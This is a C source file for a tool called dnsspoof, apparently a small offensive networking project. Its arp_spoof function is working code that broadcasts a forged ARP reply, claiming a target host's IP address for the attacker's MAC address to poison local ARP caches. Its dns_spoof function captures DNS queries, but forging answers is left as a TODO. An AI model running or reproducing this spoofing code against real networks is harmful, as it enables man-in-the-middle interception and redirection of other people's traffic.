/*
 * Copyright (C) 2017 Jan Pawlak, Piotr Markowski
 *
 * Compilation:  make
 * Usage:        ./dnsspoof HOST INTERFACE
 * NOTE:         This program requires root privileges.
 *
 */

#include <libnet.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>

void arp_spoof(char *host, char *interface){
  	libnet_t *ln;
	u_int32_t target_ip_addr, zero_ip_addr;
  	u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           	zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  	struct libnet_ether_addr* src_hw_addr;
  	char errbuf[LIBNET_ERRBUF_SIZE];

  	if ((ln = libnet_init(LIBNET_LINK, interface, errbuf)) == NULL){
		printf("arp_spoof: error initializing libnet: %s\n", errbuf);
		exit(-1);
	}
  	if ((src_hw_addr = libnet_get_hwaddr(ln)) == NULL){
		printf("arp_spoof: failed to get MAC address\n");
		exit(-1);
	}
  	if ((target_ip_addr = libnet_name2addr4(ln, host, LIBNET_RESOLVE)) == -1){
		printf("arp_spoof: failed to get IPv4 address of HOST\n");
	}
  	zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  	libnet_autobuild_arp(
    		ARPOP_REPLY,                     /* operation type       */
    		src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    		(u_int8_t*) &target_ip_addr,     /* sender protocol addr */
    		zero_hw_addr,                    /* target hardware addr */
    		(u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    		ln);                             /* libnet context       */
  	libnet_autobuild_ethernet(
    		bcast_hw_addr,                   /* ethernet destination */
    		ETHERTYPE_ARP,                   /* ethertype            */
   		ln);                             /* libnet context       */
  	libnet_write(ln);
	libnet_destroy(ln);
}

void dns_spoof(char *interface){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	char filter[32];
	struct bpf_program fp;

	memset(errbuf, 0, PCAP_ERRBUF_SIZE);
	if ((handle = pcap_open_live(interface, 1500, 1, 0, errbuf)) == NULL || strlen(errbuf) > 0){
		printf("dns_spoof: error initializing pcap: %s\n", errbuf);
		exit(-1);
	}

	sprintf(filter, "udp and dst port domain");	//Filter DNS queries

	if (pcap_compile(handle, &fp, filter, 0, 0) == -1){
		printf("dns_spoof: error compiling filter: %s\n", pcap_geterr(handle));
		exit(-1);
	}
	if (pcap_setfilter(handle, &fp) == -1){
		printf("dns_spoof: error setting filter: %s\n", pcap_geterr(handle));
	}
	
	//	TODO: pcap_loop with trap function sending fake answers

	pcap_freecode(&fp);
	pcap_close(handle);
}

int main(int argc, char** argv) {
  	if (argc < 3){
		printf("Usage: %s HOST INTERFACE\n", argv[0]);
		exit(-1);
	}
  	arp_spoof(argv[1], argv[2]);
	dns_spoof(argv[2]);
	
  	return EXIT_SUCCESS;
}
